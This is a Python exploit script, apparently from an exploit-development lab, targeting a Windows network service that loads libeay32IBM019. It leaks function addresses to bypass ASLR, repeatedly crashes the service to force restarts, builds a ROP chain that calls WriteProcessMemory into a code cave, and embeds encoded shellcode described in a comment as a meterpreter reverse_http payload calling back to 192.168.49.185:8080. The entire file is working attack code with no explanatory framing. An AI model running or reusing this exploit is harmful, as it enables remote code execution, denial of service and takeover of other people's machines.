#!/usr/bin/env python3

import socket
import sys
import time
import traceback
from struct import pack


def parseResponse(response):
    """ Parse a server response and extract the leaked address """
    pattern = b"Address is:"
    address = None
    for line in response.split(b"\n"):
        if line.find(pattern) != -1:
            address = int((line.split(pattern)[-1].strip()), 16)
    if not address:
        return 0
    return address


def leak_function_address(function_name: bytearray, server: str, port: int) -> int:
    """ Leaks a function address from the server. """
    psAgentCommand = bytearray([0x41] * 0xC)
    psAgentCommand += pack("<i", 0x2000)  # opcode
    psAgentCommand += pack("<i", 0x0)  # 1st memcpy: offset
    psAgentCommand += pack("<i", 0x100)  # 1st memcpy: size field
    psAgentCommand += pack("<i", 0x100)  # 2nd memcpy: offset
    psAgentCommand += pack("<i", 0x100)  # 2nd memcpy: size field
    psAgentCommand += pack("<i", 0x200)  # 3rd memcpy: offset
    psAgentCommand += pack("<i", 0x100)  # 3rd memcpy: size field
    psAgentCommand += bytearray([0x41] * 0x8)

    symbol = b"SymbolOperation" + function_name + b"\x00"
    psCommandBuffer = symbol + b"A" * (100 - len(symbol))
    psCommandBuffer += b"B" * 0x100
    psCommandBuffer += b"C" * 0x100

    # checksum and command.
    buf = pack(">i", len(psAgentCommand) + len(psCommandBuffer) - 4) + psAgentCommand + psCommandBuffer

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))
        s.send(buf)
        response = s.recv(1024)
        s.close()
    except:
        return 0

    return parseResponse(response)


def crash_server(server: str, port: int):
    payload_size = 0x64  # Total size of payload not including checksum.
    agent_command_size = 0x30  # Size of the agent command portion.
    command_buffer_size = payload_size - agent_command_size  # Size of the command buffer.

    agent_command_buffer = b"A" * 0x10
    agent_command_buffer += b"\x44\x61\x36\xf8"  # offset first copy. Large negative value.
    agent_command_buffer += b"\xA7\x61\x00\x00"  # size of first copy
    agent_command_buffer += b"\xA7\x61\x00\x00"  # offset for second copy
    agent_command_buffer += b"\xA7\x61\x00\x00"  # size of second copy
    agent_command_buffer += b"\xA7\x61\x00\x00"  # offset of third copy
    agent_command_buffer += b"\xA7\x61\x00\x00"  # size of third copy
    agent_command_buffer += b"A" * (agent_command_size - len(agent_command_buffer))

    buf = pack(">i", payload_size)
    buf += agent_command_buffer
    buf += bytearray([0x42] * command_buffer_size)

    continue_send_data = True
    while continue_send_data:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server, port))
            s.send(buf)
            s.close()
            continue_send_data = False
        except:
            pass


def bad_char_check(buffer: bytearray):
    bad_chars = b"\x00\x09\x0a\x0c\x0d\x20"
    for bad_char in bad_chars:
        offset = 0
        for test_byte in buffer:
            if test_byte == bad_char:
                print("Bad character detected in shell code.")
                print("Buffer offset: {}".format(offset))
                print("Character: {}".format(hex(bad_char)))
                traceback.print_stack()
                return True
            offset += 1
    return False


def upload_shell(libeay32IBM019Func: int, WPMAddr: int, server: str, port: int):
    dllBase = libeay32IBM019Func - 0x14E0
    eip_offset = 276
    command_buffer_length = 0x600

    # psAgentCommand
    buf = bytearray([0x41] * 0xC)
    buf += pack("<i", 0x534)  # opcode
    buf += pack("<i", 0x0)  # 1st memcpy: offset
    buf += pack("<i", 0x700)  # 1st memcpy: size field
    buf += pack("<i", 0x0)  # 2nd memcpy: offset
    buf += pack("<i", 0x100)  # 2nd memcpy: size field
    buf += pack("<i", 0x0)  # 3rd memcpy: offset
    buf += pack("<i", 0x100)  # 3rd memcpy: size field
    buf += bytearray([0x40] * 0x8)

    # psCommandBuffer
    wpm = b""
    wpm += pack("<L", (WPMAddr))  # WriteProcessMemory Address
    wpm += pack("<L", (dllBase + 0x92c04))  # Shellcode Return Address. <- Our code cave.
    wpm += pack("<L", (0xFFFFFFFF))  # pseudo Process handle. <- -1
    wpm += pack("<L", (dllBase + 0x92c04))  # Code cave address.
    wpm += pack("<L", (0x41414141))  # dummy lpBuffer (Stack address) <- To be edited with ROP gadgets.
    wpm += pack("<L", (0x42424242))  # dummy nSize <- To be edited with ROP gadgets.
    wpm += pack("<L", (dllBase + 0xe401c))  # lpNumberOfBytesWritten <- Writable data section of dll.
    wpm += b"\x60" * 0x10

    # Note: offset goes before wpm.
    offset = b"\x43" * (eip_offset - len(wpm))

    if bad_char_check(wpm): return True

    # Place esp into eax.
    # bp libeay32IBM019 + 0x408d6
    eip = pack("<L", (dllBase + 0x408d6))  # push esp ; pop esi ; ret <- mov esi, esp

    if bad_char_check(eip): return True

    # Patching lpBuffer
    rop = pack("<L", (dllBase + 0x296f))  # mov eax, esi ; pop esi ; ret <- eax = esi = stack pointer.
    rop += pack("<L", (0x30303030))  # junk into esi

    # Align eax to shellcode.
    # Add 100 to eax by adding large numbers.
    # 0:077> ? 0x88888888 + 0x77777878
    # Evaluate expression: 4294967552 = 00000001`00000100 = 100
    # 0:077> ? 00000001`00000100 - 88888888
    # Evaluate expression: 2004318328 = 77777878
    rop += pack("<L", (dllBase + 0x117c))  # pop ecx ; ret <- Place 0x88888888 in ecx.
    rop += pack("<L", (0x88888888))
    rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret <- add 0x88888888 to eax which contains esp.
    rop += pack("<L", (dllBase + 0x117c))  # pop ecx ; ret <- Place 0x77777878 into ecx.
    rop += pack("<L", (0x77777878))
    rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret <- add to eax.

    # Move esp + 100 to ecx.
    rop += pack("<L", (dllBase + 0x8876d))  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
    rop += pack("<L", (0x30303030))  # junk into esi
    rop += pack("<L", (dllBase + 0x48d8c))  # pop eax ; ret
    rop += pack("<L", (0x30303030))  # junk for ret 0x10
    rop += pack("<L", (0x30303030))  # junk for ret 0x10
    rop += pack("<L", (0x30303030))  # junk for ret 0x10
    rop += pack("<L", (0x30303030))  # junk for ret 0x10
    rop += pack("<L", (0xfffffee0))  # pop into eax
    rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret
    rop += pack("<L", (dllBase + 0x1fd8))  # mov [eax], ecx ; ret

    # Patching nSize
    rop += pack("<L", (dllBase + 0xbc79))  # inc eax ; ret
    rop += pack("<L", (dllBase + 0xbc79))  # inc eax ; ret
    rop += pack("<L", (dllBase + 0xbc79))  # inc eax ; ret
    rop += pack("<L", (dllBase + 0xbc79))  # inc eax ; ret
    rop += pack("<L", (dllBase + 0x408dd))  # push eax ; pop esi ; ret
    rop += pack("<L", (dllBase + 0x48d8c))  # pop eax ; ret
    rop += pack("<L", (0xfffffdf4))  # -524
    rop += pack("<L", (dllBase + 0x1d8c2))  # neg eax ; ret
    rop += pack("<L", (dllBase + 0x8876d))  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
    rop += pack("<L", (0x30303030))  # junk into esi
    rop += pack("<L", (dllBase + 0x1fd8))  # mov [eax], ecx ; ret
    rop += pack("<L", (0x30303030))  # junk for ret 0x10
    rop += pack("<L", (0x30303030))  # junk for ret 0x10
    rop += pack("<L", (0x30303030))  # junk for ret 0x10
    rop += pack("<L", (0x30303030))  # junk for ret 0x10

    # Align ESP with ROP Skeleton
    rop += pack("<L", (dllBase + 0x117c))  # pop ecx ; ret
    rop += pack("<L", (0xffffffec))  # -0x14
    rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret
    rop += pack("<L", (dllBase + 0x5b415))  # xchg eax, esp ; ret
    # Okay, executing WriteProcessMemory and will return to shell code in memory.

    if bad_char_check(rop): return True

    padding = b"\x90" * 0xe0
    # Note: This is actually dummy shellcode I just copied from a previous exploit.
    # msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.49.185 LPORT=8080 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode -o shellcode.txt
    # shellcode = bytes(subprocess.check_output(["/usr/bin/msf-pattern_create", "-l", str(0x200)]).strip())
    shellcode = b""
    shellcode += b"\xdb\xd1\xbf\xdc\xe6\xc6\xae\xd9\x74\x24\xf4"
    shellcode += b"\x58\x31\xc9\xb1\x84\x83\xc0\x04\x31\x78\x16"
    shellcode += b"\x03\x78\x16\xe2\x29\x1a\x2e\x21\xd1\xe3\xaf"
    shellcode += b"\x5e\xe0\x31\x26\x7b\x66\x3d\x6b\xb4\xed\x13"
    shellcode += b"\x80\x3f\xa3\x87\x13\x4d\x6b\x99\xdc\xbd\xdc"
    shellcode += b"\x93\x04\xf3\xe2\x88\x75\x92\x9e\xd2\xa9\x74"
    shellcode += b"\x9f\x1c\xbc\x75\xd8\xea\xca\x9a\xb4\xbb\xbf"
    shellcode += b"\x37\x28\xcf\x82\x8b\x49\x1f\x89\xb4\x31\x1a"
    shellcode += b"\x4e\x40\x8d\x25\x9f\x22\x55\x06\x94\x7d\x7d"
    shellcode += b"\x16\xab\xae\xf8\x5f\xdf\x6c\x33\x9f\x69\x06"
    shellcode += b"\x07\xd4\x6b\xce\x56\x2a\xc7\x2f\x57\xa7\x19"
    shellcode += b"\x77\x5f\x58\x6c\x83\x9c\xe5\x77\x50\xdf\x31"
    shellcode += b"\xfd\x47\x47\xb1\xa5\xa3\x76\x16\x33\x27\x74"
    shellcode += b"\xd3\x37\x6f\x98\xe2\x94\x1b\xa4\x6f\x1b\xcc"
    shellcode += b"\x2d\x2b\x38\xc8\x76\xef\x21\x49\xd2\x5e\x5d"
    shellcode += b"\x89\xba\x3f\xfb\xc1\x28\x29\x7b\x2a\xb3\x56"
    shellcode += b"\x21\xbd\x25\xcc\xae\x3d\xd1\x79\x26\x50\x48"
    shellcode += b"\xd2\xd0\xe0\xfd\xfc\x27\x06\xd4\x30\xf3\xab"
    shellcode += b"\x85\x61\x50\x1f\xc1\xc9\x56\x9f\x11\x9b\x39"
    shellcode += b"\xe5\x78\x4f\xaa\x78\x55\xba\x1c\x4b\x89\xec"
    shellcode += b"\x37\xc2\xa7\x88\xd8\x63\x44\x71\x69\xd8\x8a"
    shellcode += b"\x40\x45\xce\xfa\x99\x85\x59\x93\xb3\xf3\x51"
    shellcode += b"\x58\x6c\x84\xaf\xaa\x57\x54\xa2\xa4\x9d\xad"
    shellcode += b"\x76\x66\xd2\xe4\x56\x31\x77\x94\xfd\xd2\x58"
    shellcode += b"\x68\x32\x1d\x97\xbc\x03\x6d\xe6\x9c\x25\xe4"
    shellcode += b"\x7a\xb8\xcf\x99\x02\x6d\x29\x51\xdd\x41\x49"
    shellcode += b"\xf1\x1b\xf4\x30\xa6\xa3\x2d\x91\xfb\x31\xcd"
    shellcode += b"\x45\xa8\xad\x41\x76\x4e\x2e\x8a\x5f\x4e\x2e"
    shellcode += b"\x4a\x4f\x27\x5f\x2f\xbe\xd3\xab\xea\xab\x71"
    shellcode += b"\xb3\xa2\x41\xd5\x56\x02\xc9\x94\xdc\xd0\x9d"
    shellcode += b"\x23\x6a\x9c\x39\x11\xa1\x73\xa9\xd2\xa0\xf3"
    shellcode += b"\x7e\x4c\x54\x6e\xf3\x0f\xc5\x5b\xc6\x8c\xbe"
    shellcode += b"\xe0\x6a\x4a\x22\xbf\x07\x30\xe9\x4d\xb3\xa3"
    shellcode += b"\x96\xeb\x04\x78\x06\x64\xc8\x1c\xdc\x2c\xa4"
    shellcode += b"\xd5\x73\xfc\x53\x7e\xc3\x98\xe0\xd5\xbd\x13"
    shellcode += b"\xbf\x80\x13\x9b\x74\x73\xc4\x4d\xff\xf3\x92"
    shellcode += b"\xce\xba\xb6\x5a\xa1\x2c\x6f\xd2\xde\x6b\x70"
    shellcode += b"\x31\x69\xb5\xdd\xd2\x6a\x38\x89\xa6\x38\x6f"
    shellcode += b"\x1a\xf0\xed\xd9\xf4\x15\x44\xc8\x3f\x15\xb2"
    shellcode += b"\x82\x55\xe3\x62\xf8\xfa\xa0\xcf\xa8\x94\x6b"
    shellcode += b"\xf6\x4c\x1f\x8b\x23\xe9\x1f\x06\xd8\x9a\x17"
    shellcode += b"\xfa\xe0\x5a\x4f\xb9\x10\x6f\x6f\xbe\x04\xdf"
    shellcode += b"\x1a\xa0\x4f\xab\xe4\x22\x90\x46\xa4\x4a\x90"
    shellcode += b"\x86\x24\x8b\xf8\xa6\x24\xcb\xf8\xf5\x4c\x93"
    shellcode += b"\x5c\xaa\x69\xdc\x48\xde\x22\x70\xfa\x06\x93"
    shellcode += b"\x1e\xfc\xe8\x1b\xdf\xaf\xbe\x73\xcd\xd9\xb6"
    shellcode += b"\x61\x0e\x30\x4d\xa5\x85\x74\xc5\x22\x67\x48"
    shellcode += b"\x5f\xec\x12\xab\x38\x2f\x83\xdb\xc6\x50\xc3"
    shellcode += b"\xe3\x08\x97\x0e\x32\x5a\xd1\x56\x64\xa8\x24"
    shellcode += b"\x89\x49\xe8\x63\xd5\x12\xf8\x3e\x77\x32\x93"
    shellcode += b"\x40\x2b\x44\xb6"
    shellcode += b"\xcc" * (command_buffer_length - eip_offset - 4 - len(rop) - len(padding) - len(shellcode))

    if bad_char_check(shellcode): return True

    payload = offset + wpm + eip + rop + padding + shellcode

    if bad_char_check(payload): return True

    formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (payload, 0, 0, 0, 0)
    buf += formatString

    # Checksum
    buf = pack(">i", len(buf) - 4) + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()

    return False


def main():
    bad_chars = b"\x00\x09\x0a\x0c\x0d\x20"
    server = "192.168.185.10"
    port = 11460
    bad_chars_remain = True
    write_process_memory_addr = 0
    get_new_lockid_addr = 0
    libeay32IBM019Base = 0

    while bad_chars_remain:
        while write_process_memory_addr == 0 or get_new_lockid_addr == 0 or libeay32IBM019Base == 0:
            write_process_memory_addr = leak_function_address(b"WriteProcessMemory", server, port)
            get_new_lockid_addr = leak_function_address(b"N98E_CRYPTO_get_new_lockid", server, port)
            libeay32IBM019Base = get_new_lockid_addr - 0x14E0


        print("WriteProcessMemory Address: " + hex(write_process_memory_addr))
        print("N98E_CRYPTO_get_new_lockid Address: " + hex(get_new_lockid_addr))
        print("Libeay32IBM019 Base Address: " + hex(libeay32IBM019Base))

        base_address_bytes = pack(">i", libeay32IBM019Base)
        bad_chars_remain = False

        for bad_char in bad_chars:
            if base_address_bytes[0] == bad_char or base_address_bytes[1] == bad_char:
                print("Bad character detected. Restarting server...")
                print("Note: It might take a while for the server to restart.")
                bad_chars_remain = True
                crash_server(server, port)
                write_process_memory_addr = 0
                get_new_lockid_addr = 0
                libeay32IBM019Base = 0
                break;

        bad_chars_remain = upload_shell(get_new_lockid_addr, write_process_memory_addr, server, port)
        if bad_chars_remain:
            print("Bad characters in payload. Restarting server..")
            print("Note: It might take a while for the server to restart.")
            crash_server(server, port)
            write_process_memory_addr = 0
            get_new_lockid_addr = 0
            libeay32IBM019Base = 0

    print("Exploit sent!")
    sys.exit(0)


if __name__ == "__main__":
    main()
